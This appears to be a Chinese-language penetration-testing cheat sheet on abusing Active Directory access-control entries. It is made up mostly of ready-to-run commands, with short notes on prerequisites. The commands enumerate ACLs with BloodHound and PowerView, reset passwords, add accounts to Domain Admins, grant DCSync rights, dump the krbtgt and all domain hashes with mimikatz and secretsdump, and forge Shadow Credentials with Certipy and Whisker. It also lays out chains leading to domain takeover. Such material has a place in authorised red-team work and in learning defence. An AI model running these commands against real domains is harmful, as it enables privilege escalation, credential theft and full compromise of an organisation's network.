# AD ACL/ACE 滥用

## §0 ACL枚举

**场景**: 拿到域内任意用户凭据后，枚举高价值对象的DACL找可利用ACE
**工具**:
```powershell
# BloodHound采集（推荐SharpHound，覆盖ACL边）
.\SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp
# Linux远程采集
bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All

# PowerView手动查ACE
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "CONTROLLED_USER"}
Get-DomainObjectAcl -Identity "TARGET_USER" -ResolveGUIDs | ?{$_.SecurityIdentifier -match "CONTROLLED_SID"}

# 查谁对DC有DCSync权限
Get-DomainObjectAcl "DC=domain,DC=com" -ResolveGUIDs | ?{$_.ObjectAceType -match "Replicating"}
```
**要点**: BloodHound自动标记Shortest Path to Domain Admin，优先看ACL边（GenericAll/WriteDACL/WriteOwner）

## §1 GenericAll（完全控制）

**前置**: 当前用户对目标对象拥有GenericAll权限
**场景A — 对用户**:
```powershell
# 重置密码（不需要旧密码）
net user TARGET_USER NewP@ss123 /domain
# PowerView
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString 'NewP@ss123' -AsPlainText -Force)
# impacket远程
python changepasswd.py DOMAIN/TARGET_USER@DC_IP -newpass 'NewP@ss123' -altuser CTRL_USER -altpass CTRL_PASS
```
**场景B — 对组**:
```powershell
# 把自己加到高权限组
Add-DomainGroupMember -Identity "Domain Admins" -Members CONTROLLED_USER
net group "Domain Admins" CONTROLLED_USER /add /domain
```
**场景C — 对计算机**:
```powershell
# 设Kerberos委派 → RBCD攻击（见 delegation.md §2）
Set-DomainObject -Identity TARGET_PC$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$RAW_BYTES}
# 或设SPN → Kerberoast
Set-DomainObject -Identity TARGET_PC$ -Set @{serviceprincipalname='fake/svc'}
```

## §2 WriteDACL / WriteOwner

**前置**: 对目标对象有WriteDACL或WriteOwner权限
```powershell
# WriteOwner: 先把自己设为Owner
Set-DomainObjectOwner -Identity TARGET -OwnerIdentity CONTROLLED_USER

# WriteDACL: 给自己加DCSync权限（对域根对象操作）
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity CONTROLLED_USER -Rights DCSync

# impacket远程（dacledit.py）
python dacledit.py -action write -rights DCSync -principal CTRL_USER -target-dn "DC=domain,DC=com" DOMAIN/CTRL_USER:PASS@DC_IP
```
**要点**: WriteDACL→加DCSync权限→§3 DCSync 是经典三步链

## §3 DCSync

**前置**: 拥有 DS-Replication-Get-Changes + DS-Replication-Get-Changes-All 权限（默认Domain Admins/DC有）
```powershell
# mimikatz
lsadump::dcsync /domain:DOMAIN /user:krbtgt
lsadump::dcsync /domain:DOMAIN /all /csv

# impacket（远程，无需上线DC）
python secretsdump.py DOMAIN/USER:PASS@DC_IP -just-dc-ntlm
python secretsdump.py DOMAIN/USER:PASS@DC_IP -just-dc-user krbtgt
```
**产出**: krbtgt NTLM hash → Golden Ticket（见 ticket.md §3）; 全域hash → 离线破解/PTH

## §4 Shadow Credentials

**前置**: 对目标计算机/用户有GenericWrite/GenericAll权限 + 域内有ADCS或Key Trust配置
```powershell
# Whisker（C#）
.\Whisker.exe add /target:TARGET_PC$ /domain:DOMAIN /dc:DC_IP

# Certipy（Python，推荐）
certipy shadow auto -u CTRL_USER@DOMAIN -p PASS -target TARGET_PC$ -dc-ip DC_IP
# 输出: PFX证书 → PKINIT认证获取TGT
certipy auth -pfx TARGET_PC$.pfx -dc-ip DC_IP
```
**原理**: 写msDS-KeyCredentialLink属性 → 伪造Key Credential → PKINIT获取TGT → U2U获取NTLM hash
**适用**: 域功能级别≥2016，或已部署ADCS

## §5 AddMember / ForceChangePassword

**前置**: 对目标组有AddMember权限 / 对目标用户有ForceChangePassword权限
```powershell
# AddMember — 加组
Add-DomainGroupMember -Identity "IT Admins" -Members CONTROLLED_USER
# 验证
Get-DomainGroupMember -Identity "IT Admins" | ?{$_.MemberName -match "CONTROLLED"}

# ForceChangePassword — 重置密码（不需旧密码，不需GenericAll）
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString 'NewP@ss' -AsPlainText -Force)
# rpcclient
rpcclient -U "DOMAIN\CTRL_USER%PASS" DC_IP -c "setuserinfo2 TARGET_USER 23 'NewP@ss'"
```
**攻击链示例**: ForceChangePassword→重置IT管理员密码→RDP登录管理跳板→横向到DC
